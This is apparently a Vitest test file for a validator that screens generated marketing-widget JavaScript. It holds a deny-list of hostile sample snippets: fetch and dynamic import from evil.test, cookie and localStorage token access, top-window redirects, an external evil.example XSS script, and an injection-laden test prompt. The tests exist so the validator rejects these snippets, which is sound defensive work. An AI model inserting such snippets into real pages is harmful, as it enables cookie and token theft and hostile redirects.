import { describe, expect, it } from 'vitest';
import {
  CONTAINER_IDS,
  buildDemoFallbackCode,
  stripCodeFences,
  validateCampaignCode,
} from '../src/core/codeValidator.js';
import { POPUP_TEMPLATES } from '../src/templates/popupTemplates.js';
import { BANNER_TEMPLATES } from '../src/templates/bannerTemplates.js';
import { EARLET_TEMPLATES } from '../src/templates/earletTemplates.js';

describe('codeValidator', () => {
  describe('stripCodeFences', () => {
    it('strips markdown fences and wrapper <script> tags while keeping external script src intact', () => {
      const fenced = '```javascript\n<script>\n(function(){ console.log(1); })();\n</script>\n```';
      expect(stripCodeFences(fenced)).toBe('(function(){ console.log(1); })();');

      const withIntro = 'Here is the code:\n```js\nconst x = 1;\n```';
      expect(stripCodeFences(withIntro)).toBe('const x = 1;');

      const externalScript = '<script src="https://evil.example/xss.js"></script>';
      expect(stripCodeFences(externalScript)).toContain('<script src="https://evil.example/xss.js">');
    });
  });

  describe('validateCampaignCode', () => {
    it('accepts valid IIFE and duplicate-mount guard widgets for all campaign types', () => {
      for (const [type, containerId] of Object.entries(CONTAINER_IDS)) {
        const iife = `\`\`\`js\n(function () {\n  if (document.getElementById('${containerId}')) return;\n  const el = document.createElement('div');\n  el.id = '${containerId}';\n  document.body.appendChild(el);\n})();\n\`\`\``;
        const result = validateCampaignCode(iife, type);
        expect(result.ok).toBe(true);
        expect(result.errors).toEqual([]);
        expect(result.code).not.toContain('```');
      }
    });

    it('rejects empty code, oversized code, and unknown campaign types', () => {
      expect(validateCampaignCode('', 'popup').ok).toBe(false);
      expect(validateCampaignCode('   ', 'popup').errors[0]).toMatch(/empty/i);
      expect(validateCampaignCode('(function(){ ca-widget-popup-container })();', 'modal').ok).toBe(false);

      const huge = `(function(){ /* ${'a'.repeat(65_050)} */ if(document.getElementById('ca-widget-popup-container')) return; })();`;
      const oversized = validateCampaignCode(huge, 'popup');
      expect(oversized.ok).toBe(false);
      expect(oversized.errors.some((e) => /maximum length/i.test(e))).toBe(true);
    });

    it('rejects missing container ID, missing guard/IIFE, and JS syntax errors', () => {
      const wrongId = `(function(){ if(document.getElementById('ca-widget-banner-container')) return; })();`;
      const resWrongId = validateCampaignCode(wrongId, 'popup');
      expect(resWrongId.ok).toBe(false);
      expect(resWrongId.errors.some((e) => e.includes('ca-widget-popup-container'))).toBe(true);

      const noGuard = `const id = 'ca-widget-popup-container'; console.log(id);`;
      const resNoGuard = validateCampaignCode(noGuard, 'popup');
      expect(resNoGuard.ok).toBe(false);
      expect(resNoGuard.errors.some((e) => /IIFE|getElementById/i.test(e))).toBe(true);

      const syntaxErr = `(function(){ if (!document.getElementById('ca-widget-popup-container')) { const x = ; } })();`;
      const resSyntax = validateCampaignCode(syntaxErr, 'popup');
      expect(resSyntax.ok).toBe(false);
      expect(resSyntax.errors.some((e) => /syntax/i.test(e))).toBe(true);
    });

    it('rejects dangerous browser, storage, and network patterns', () => {
      const dangerousSnippets = [
        `eval('alert(1)')`,
        `new Function('return 1')()`,
        `fetch('https://evil.test')`,
        `new XMLHttpRequest()`,
        `document.cookie = 'a=b'`,
        `localStorage.getItem('token')`,
        `sessionStorage.setItem('k', 'v')`,
        `indexedDB.open('db')`,
        `window.top.location = 'https://evil.test'`,
        `parent.location = 'https://evil.test'`,
        `import('https://evil.test/mod.js')`,
      ];

      for (const snippet of dangerousSnippets) {
        const code = `(function(){ if (!document.getElementById('ca-widget-popup-container')) { ${snippet}; } })();`;
        const res = validateCampaignCode(code, 'popup');
        expect(res.ok).toBe(false);
        expect(res.errors.length).toBeGreaterThan(0);
      }

      const extScript = `(function(){ /* <script src="https://evil.test/x.js"></script> */ if (!document.getElementById('ca-widget-popup-container')) {} })();`;
      expect(validateCampaignCode(extScript, 'popup').ok).toBe(false);
    });
  });

  describe('buildDemoFallbackCode', () => {
    it('creates valid fallback widgets for popup, banner, and earlet even with tricky characters', () => {
      const trickyPrompt = `Kırmızı %40 indirim "Yaz Fırsatı" \`backtick\` \${alert(1)} <script>x</script>`;
      for (const type of ['popup', 'banner', 'earlet']) {
        const code = buildDemoFallbackCode(type, trickyPrompt, '');
        const check = validateCampaignCode(code, type);
        expect(check.ok, `${type} errors: ${check.errors.join(', ')}`).toBe(true);
        expect(code).toContain(CONTAINER_IDS[type]);
        expect(code).toContain('// [TRACKING_IMPRESSION]');
        expect(code).toContain('// [TRACKING_CLICK]');
        expect(code).toContain('__CA_EDIT_MODE__');
      }
    });

    it('deterministically patches existing valid widget code with color, discount, and text cues', () => {
      const baseCode = POPUP_TEMPLATES[0].code;
      const patchedOnce = buildDemoFallbackCode(
        'popup',
        'arka planı yeşil yap %50 indirim buton "Hemen Yakala"',
        baseCode
      );
      expect(validateCampaignCode(patchedOnce, 'popup').ok).toBe(true);
      expect(patchedOnce).toContain('#059669');
      expect(patchedOnce).toContain('CA Demo Theme Patch');

      const patchedTwice = buildDemoFallbackCode('popup', 'mavi olsun', patchedOnce);
      expect(validateCampaignCode(patchedTwice, 'popup').ok).toBe(true);
      expect(patchedTwice).toContain('#2563eb');
      expect(patchedTwice.match(/CA Demo Theme Patch/g)?.length).toBe(1);
    });
  });

  describe('built-in templates validation & sanitization', () => {
    it('validates all popup, banner, and earlet templates with clean container IDs and demo hosts', () => {
      const groups = [
        { type: 'popup', templates: POPUP_TEMPLATES },
        { type: 'banner', templates: BANNER_TEMPLATES },
        { type: 'earlet', templates: EARLET_TEMPLATES },
      ];

      const allowedHosts = new Set([
        'images.unsplash.com',
        'cdn-icons-png.flaticon.com',
        'example.com',
        'www.w3.org',
      ]);

      for (const group of groups) {
        expect(group.templates.length).toBeGreaterThan(0);
        for (const tpl of group.templates) {
          const check = validateCampaignCode(tpl.code, group.type);
          expect(check.ok, `Template ${group.type}/${tpl.id} failed: ${check.errors.join('; ')}`).toBe(true);
          expect(tpl.code).toContain(`ca-widget-${group.type}-container`);

          const urls = tpl.code.match(/https?:\/\/[^\s'"`<>)]+/g) || [];
          for (const rawUrl of urls) {
            const host = new URL(rawUrl).hostname;
            expect(allowedHosts.has(host), `Unexpected host ${host} in ${tpl.id}`).toBe(true);
          }
        }
      }
    });
  });
});
